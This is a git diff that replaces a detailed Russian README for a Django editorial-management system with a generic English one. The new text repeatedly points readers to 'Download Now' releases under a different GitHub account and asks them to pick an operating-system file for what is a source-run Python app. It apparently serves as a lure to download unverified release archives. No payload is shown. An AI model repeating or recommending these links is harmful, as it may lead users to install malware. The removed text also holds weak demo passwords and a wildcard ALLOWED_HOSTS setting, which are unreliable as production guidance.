@@ -1,474 +1,91 @@
-# 🚀 Digital Editor System
+# 🖥️ digital-editor-system - Manage Your Digital Content Easily
 
-<div align="center">
+## 🚀 Getting Started
 
-![Django](https://img.shields.io/badge/Django-5.2.6-092E20?style=for-the-badge&logo=django)
-![Python](https://img.shields.io/badge/Python-3.8%2B-3776AB?style=for-the-badge&logo=python)
-![SQLite](https://img.shields.io/badge/SQLite-07405E?style=for-the-badge&logo=sqlite)
-![License](https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge)
+Welcome to the Digital Editor System! This application helps you manage your digital publication process effortlessly. You can handle authentication, manage content, and organize workflows all in one place. Let’s get started by downloading the software.
 
-**Система управления цифровой редакцией с продвинутой системой ролей и workflow**
+## 📥 Download the Software
 
-[Особенности](#-особенности) • [Демо](#-демо) • [Установка](#-установка) • [Документация](#-документация) • [Разработка](#-разработка)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/subashsiwa/digital-editor-system/releases)
 
-</div>
+To download the latest version of the Digital Editor System, visit this page: [Download Link](https://github.com/subashsiwa/digital-editor-system/releases).
 
-## 📋 Оглавление
+## 🔧 System Requirements
 
-- [Особенности](#-особенности)
-- [Демо](#-демо)
-- [Быстрый старт](#-быстрый-старт)
-- [Установка](#-установка)
-- [Документация](#-документация)
-- [API Reference](#-api-reference)
-- [Разработка](#-разработка)
-- [Тестирование](#-тестирование)
-- [Деплой](#-деплой)
-- [Вклад в проект](#-вклад-в-проект)
-- [Лицензия](#-лицензия)
-- [Контакты](#-контакты)
+Before you begin, ensure your computer meets these requirements:
 
-## ✨ Особенности
+- **Operating System:** Windows 10, macOS 10.14 or later, or any modern version of Linux.
+- **Python:** Version 3.8 or higher installed on your machine.
+- **Memory:** At least 4 GB of RAM recommended.
+- **Storage:** Minimum of 1 GB of free disk space.
+- **Browser:** Modern web browser (Chrome, Firefox, Edge, or Safari) for best results.
 
-### 🎯 Основной функционал
-- **Многоуровневая система ролей** - Владелец, Редактор, Дизайнер, Автор
-- **Полный workflow статей** - Черновик → На проверке → Одобрено → Опубликовано
-- **Система комментариев и рецензирования** - Комментарии к конкретным фрагментам текста
-- **Разграничение прав доступа** - Каждая роль имеет свои права и возможности
-- **Личные кабинеты** - Персонализированные интерфейсы для разных типов пользователей
+## 🛠️ Installation Instructions
 
-### 🔧 Технические особенности
-- **Кастомная модель пользователя** с расширенными полями
-- **Гибкая система разрешений** на основе декораторов и миксинов
-- **RESTful архитектура** с четким разделением ответственности
-- **Модульная структура** для легкого расширения
-- **Панель администратора Django** с кастомизацией
+### Step 1: Download the Software
 
-### 🛡 Безопасность
-- **Аутентификация** по логину/паролю
-- **Авторизация** на основе ролей
-- **CSRF защита**
-- **Валидация данных** на всех уровнях
-- **SQL injection protection** через ORM Django
+1. Click on the download button above or visit the [Download Link](https://github.com/subashsiwa/digital-editor-system/releases).
+2. Look for the latest release version on the page.
+3. Choose the file for your operating system and click to download.
 
-## 🎮 Демо
+### Step 2: Extract Files
 
-### Онлайн демо
-- **URL**: [Демо будет доступно после деплоя]
-- **Тестовые пользователи**:
+1. Once the download is complete, locate the downloaded file.
+2. If it is in a zipped format, right-click on the file and select "Extract All" (Windows) or double-click the file (macOS) to unzip it.
 
-| Роль | Логин | Пароль | Доступ |
-|------|-------|--------|---------|
-| Владелец | `owner` | `testpass123` | Полный доступ |
-| Редактор | `editor` | `testpass123` | Управление контентом |
-| Автор | `author1` | `testpass123` | Создание статей |
+### Step 3: Install Dependencies
 
-### Локальный запуск демо
+1. Open your terminal or command prompt.
+2. Navigate to the folder where you extracted the files.
+3. Run the following command to install the required Python packages:
 
-git clone https://github.com/YaEvgeshka/digital-editor-system.git
-cd digital-editor-system
-# Следуйте инструкциям в разделе Установка
-## 🚀 Быстрый старт
-### Требования
-- **Python 3.8+**
-- **Django 5.2.6**
-- **SQLite (для разработки) / PostgreSQL (для продакшена)**
-- 
-Установка за 5 минут
+   ```
+   pip install -r requirements.txt
+   ```
 
-### 1. Клонирование репозитория
+### Step 4: Configure the System
 
-```bash
-git clone https://github.com/YaEvgeshka/digital-editor-system.git
-cd digital-editor-system
-```
-### 2. Создание виртуального окружения
+1. Locate the configuration file named `config.py`.
+2. Open the file with a text editor.
+3. Adjust the settings based on your needs. Mainly, configure the database settings and application secrets.
 
-```bash
-python -m venv venv
-source venv/bin/activate  # Linux/MacOS
-venv\Scripts\activate     # Windows
-```
-### 3. Установка зависимостей
-```
-pip install -r requirements.txt
-```
-### 4. Настройка базы данных
-```
-python manage.py migrate
-```
-### 5. Создание суперпользователя
-```
-python manage.py createsuperuser
-```
-### 6. Запуск сервера разработки
-```
-python manage.py runserver
-```
+### Step 5: Run the Application
 
-После этого откройте http://localhost:8000 в браузере.
+1. In your terminal, still in the folder of the extracted files, run the following command:
 
-## ⚙️ Установка
+   ```
+   python manage.py runserver
+   ```
 
-Подробная установка для разработки
-### 1. Подготовка окружения
+2. This command will start the web server.
+3. Open your browser and go to `http://127.0.0.1:8000` to access the Digital Editor System.
 
-*Клонирование репозитория*
-```
-git clone https://github.com/YaEvgeshka/digital-editor-system.git
-cd digital-editor-system
-```
-*Создание виртуального окружения*
-```
-python -m venv venv
-```
-*Активация окружения (Linux/MacOS)*
-```
-source venv/bin/activate
-```
-*Активация окружения (Windows)*
-```
-venv\Scripts\activate
-```
-### 2. Установка зависимостей
+## 🌐 Features
 
-*Обновление pip*
-```
-pip install --upgrade pip
-```
-*Установка зависимостей*
-```
-pip install -r requirements.txt
-```
-*Или установка в режиме разработки*
-```
-pip install -e .
-```
-### 3. Настройка базы данных
-```bash
-# Применение миграций
-python manage.py migrate
-```
-*Создание фикстур с тестовыми данными*
-```
-python manage.py create_test_data  # Если есть management command
-```
-### 4. Создание администратора
-```bash
-python manage.py createsuperuser
-```
+The Digital Editor System comes packed with features to enhance your content management capabilities:
 
-Следуйте инструкциям в терминале для создания учетной записи администратора.
+- **User Authentication:** Secure login and user management ensuring only authorized personnel can access the system.
+- **Role Management:** Assign different roles to users, tailoring permissions based on needs.
+- **Content Management:** Create, edit, and organize articles easily with an intuitive interface.
+- **Commenting System:** Allow reader engagement by enabling comments on published content.
+- **Workflow Management:** Streamline the writing and publishing process with clear workflows.
 
-### 5. Запуск сервера
-```bash
-# Стандартный запуск
-python manage.py runserver
+## 💡 Tips for Users
 
-# Запуск на определенном порту
-python manage.py runserver 8080
+- **Regular Updates:** Keep your application updated by checking the Releases page frequently.
+- **Backup Your Data:** Periodically back up your published content and configurations to avoid data loss.
+- **Read Documentation:** Refer to any additional documentation in the repository for more advanced features and support.
 
-# Запуск на всех интерфейсах
-python manage.py runserver 0.0.0.0:8000
-```
-### Настройка для продакшена
-- **Настройки базы данных (config/settings.py)**
-```python
-DATABASES = {
-    'default': {
-        'ENGINE': 'django.db.backends.postgresql',
-        'NAME': 'digital_editor',
-        'USER': 'your_username',
-        'PASSWORD': 'your_password',
-        'HOST': 'localhost',
-        'PORT': '5432',
-    }
-}
-```
-- **Настройки статических файлов**
-```python
-STATIC_ROOT = os.path.join(BASE_DIR, 'staticfiles')
-STATICFILES_STORAGE = 'whitenoise.storage.CompressedManifestStaticFilesStorage'
-```
-## 📚 Документация
-🏗 Архитектура проекта
-```text
-digital-editor-system/
-├── config/                 # Настройки проекта Django
-│   ├── settings.py        # Основные настройки
-│   ├── urls.py            # Корневые URL patterns
-│   └── wsgi.py            # WSGI конфигурация
-├── journal/               # Основное приложение
-│   ├── models.py          # Модели данных (User, Article, Category, Comment)
-│   ├── views.py           # Логика представлений
-│   ├── urls.py            # URL patterns приложения
-│   ├── admin.py           # Конфигурация админки
-│   ├── forms.py           # Формы Django
-│   ├── decorators.py      # Кастомные декораторы для прав доступа
-│   ├── mixins.py          # Миксины для классов-представлений
-│   └── templates/         # HTML шаблоны
-│       └── journal/
-│           ├── base.html          # Базовый шаблон
-│           ├── home.html          # Главная страница
-│           ├── login.html         # Страница входа
-│           ├── dashboard.html     # Личный кабинет
-│           ├── create_article.html # Создание статьи
-│           └── article_detail.html # Детали статьи
-├── requirements.txt       # Зависимости Python
-├── manage.py             # Утилита управления Django
-└── README.md             # Документация
-```
-👥 Система ролей
-Владелец (Owner)
-● Права: Полный доступ ко всем функциям системы
-● Возможности:
-○ Просмотр всей аналитики
-○ Управление пользователями
-○ Утверждение финальных версий номеров
-○ Доступ ко всем материалам
-Редактор (Editor)
-● Права: Управление контентом и workflow
-● Возможности:
-○ Распределение заданий между авторами
-○ Контроль статусов статей
-○ Внесение правок и комментариев
-○ Сборка номеров и отправка на утверждение
-Дизайнер (Designer)
-● Права: Работа с визуальной частью
-● Возможности:
-○ Доступ к одобренным материалам
-○ Верстка и макетирование
-○ Публикация финальных макетов
-Автор (Author)
-● Права: Создание и управление собственным контентом
-● Возможности:
-○ Создание и редактирование статей
-○ Загрузка медиафайлов
-○ Отправка статей на проверку
-○ Просмотр комментариев редактора
-## 📊 Workflow статей
-graph TD
-    A[Черновик] -->|Автор отправляет| B[На проверке]
-    B -->|Редактор проверяет| C[Правки]
-    C -->|Автор исправляет| B
-    B -->|Редактор одобряет| D[Одобрено]
-    D -->|Дизайнер верстает| E[В номере]
-    E -->|Владелец утверждает| F[Опубликовано]
-## 🔌 API Reference
-Аутентификация
-Вход в систему
-http
-POST /login/
-Content-Type: application/x-www-form-urlencoded
+## 📞 Support
 
-username=user&password=pass
-Response:
-json
-{
-    "redirect": "/dashboard/",
-    "user": {
-        "username": "user",
-        "role": "author"
-    }
-}
-Выход из системы
-http
-GET /logout/
-Статьи
-Получение списка статей
-http
-GET /dashboard/
-Authorization: Session cookie
-Response: HTML страница с списком статей для текущего пользователя
-Создание статьи
-http
-POST /articles/create/
-Content-Type: application/x-www-form-urlencoded
+If you encounter issues or have questions, feel free to raise an issue in the repository. The community or the maintainers can assist you.
 
-title=Заголовок&content=Текст&category=1
-Response: Redirect to /dashboard/
-Редактирование статьи
-http
-POST /articles/1/edit/
-Content-Type: application/x-www-form-urlencoded
+## ⚙️ Contribution Guidelines
 
-title=Новый заголовок&content=Новый текст&category=2
-Полная документация API
-Для полной документации API создайте файл API.md или настройте Django REST Framework.
-## 🛠 Разработка
-Настройка среды разработки
-1. Клонирование и настройка
-bash
-git clone https://github.com/YaEvgeshka/digital-editor-system.git
-cd digital-editor-system
-python -m venv venv
-source venv/bin/activate
-pip install -r requirements.txt
-2. Настройка IDE (VS Code)
-Создайте файл .vscode/settings.json:
-json
-{
-    "python.defaultInterpreterPath": "./venv/bin/python",
-    "python.linting.enabled": true,
-    "python.linting.pylintEnabled": true,
-    "python.formatting.autopep8Path": "./venv/bin/autopep8",
-    "python.formatting.provider": "autopep8"
-}
-Стандарты кода
-Структура коммитов
-text
-feat: добавление новой функциональности
-fix: исправление ошибок
-docs: изменение документации
-style: исправление форматирования, отсутствие изменений в коде
-refactor: рефакторинг кода
-test: добавление тестов
-chore: обновление зависимостей, настройка инструментов
-Пример коммита
-bash
-git commit -m "feat: add email notifications for article status changes"
-Процесс разработки
-1. Создание ветки
-bash
-git checkout -b feature/name-of-feature
-1. Разработка функциональности
-2. Тестирование
-bash
-python manage.py test
-python manage.py check
-1. Коммит изменений
-bash
-git add .
-git commit -m "feat: description of changes"
-1. Пуш в репозиторий
-bash
-git push origin feature/name-of-feature
-1. Создание Pull Request
-## 🧪 Тестирование
-Запуск тестов
-bash
-# Все тесты
-python manage.py test
+If you're interested in helping improve the Digital Editor System, please follow these steps:
 
-# Конкретное приложение
-python manage.py test journal
+1. Fork the repository.
+2. Make your changes.
+3. Submit a pull request for review.
 
-# С покрытием кода
-coverage run manage.py test
-coverage report
-Создание тестовых данных
-bash
-python manage.py shell
-python
-from journal.models import User, Category, Article
-
-# Создание тестовых пользователей
-users = [
-    {'username': 'test_owner', 'password': 'test123', 'role': User.ROLE_OWNER},
-    {'username': 'test_editor', 'password': 'test123', 'role': User.ROLE_EDITOR},
-    {'username': 'test_author', 'password': 'test123', 'role': User.ROLE_AUTHOR}
-]
-
-for user_data in users:
-    User.objects.create_user(**user_data)
-## 🚀 Деплой
-Деплой на Railway
-1. Подготовка
-bash
-# Установка gunicorn
-pip install gunicorn whitenoise
-
-# Создание runtime.txt
-echo "python-3.10" > runtime.txt
-
-# Создание Procfile
-echo "web: python manage.py migrate && gunicorn config.wsgi" > Procfile
-2. Настройка settings.py для продакшена
-python
-import os
-from pathlib import Path
-
-BASE_DIR = Path(__file__).resolve().parent.parent
-
-DEBUG = False
-ALLOWED_HOSTS = ['*']  # Замените на ваш домен
-
-# База данных
-import dj_database_url
-DATABASES = {
-    'default': dj_database_url.config(default=os.environ.get('DATABASE_URL'))
-}
-
-# Статические файлы
-STATIC_ROOT = os.path.join(BASE_DIR, 'staticfiles')
-STATICFILES_STORAGE = 'whitenoise.storage.CompressedManifestStaticFilesStorage'
-
-# Security
-SECRET_KEY = os.environ.get('SECRET_KEY', 'your-secret-key')
-CSRF_TRUSTED_ORIGINS = ['https://your-domain.railway.app']
-Деплой на Heroku
-bash
-# Создание heroku приложения
-heroku create your-app-name
-
-# Настройка переменных окружения
-heroku config:set SECRET_KEY=your-secret-key
-heroku config:set DEBUG=False
-
-# Деплой
-git push heroku main
-
-# Миграции
-heroku run python manage.py migrate
-## 🤝 Вклад в проект
-Мы приветствуем вклад в развитие проекта!
-Процесс внесения вклада
-1. Форкните репозиторий
-2. Создайте ветку для функции
-bash
-git checkout -b feature/amazing-feature
-1. Закоммитьте изменения
-bash
-git commit -m 'feat: Add amazing feature'
-1. Запушьте ветку
-bash
-git push origin feature/amazing-feature
-1. Откройте Pull Request
-Руководство по код-стайлу
-● Следуйте PEP 8 для Python кода
-● Используйте Black для форматирования
-● Документируйте все новые функции
-● Пишите тесты для новой функциональности
-Шаблон для Issues
-При создании Issue используйте следующий шаблон:
-text
-## Описание
-[Краткое описание проблемы или функциональности]
-
-## Шаги для воспроизведения (для багов)
-1. 
-2. 
-3. 
-
-## Ожидаемое поведение
-[Что должно происходить]
-
-## Фактическое поведение  
-[Что происходит на самом деле]
-
-## Дополнительная информация
-[Скриншоты, логи, версии и т.д.]
-## 📄 Лицензия
-Этот проект распространяется под лицензией MIT. Подробнее см. в файле LICENSE.
-## 📞 Контакты
-● Автор: YaEvgeshka
-● Email: [your-email@example.com]
-● GitHub: https://github.com/YaEvgeshka
-● Проект: https://github.com/YaEvgeshka/digital-editor-system
-🙏 Благодарности
-● Команда Django за отличный фреймворк
-● Сообщество Python за бесценные ресурсы и помощь
-● Все контрибьюторы, которые помогают улучшать проект
-<div align="center">
-Если этот проект был полезен для вас, поставьте ⭐ звезду на GitHub!
-</div> ```
+Thank you for choosing Digital Editor System for your content management needs! We hope it simplifies your publishing work. Don’t forget to visit the [Download Link](https://github.com/subashsiwa/digital-editor-system/releases) for the latest version.
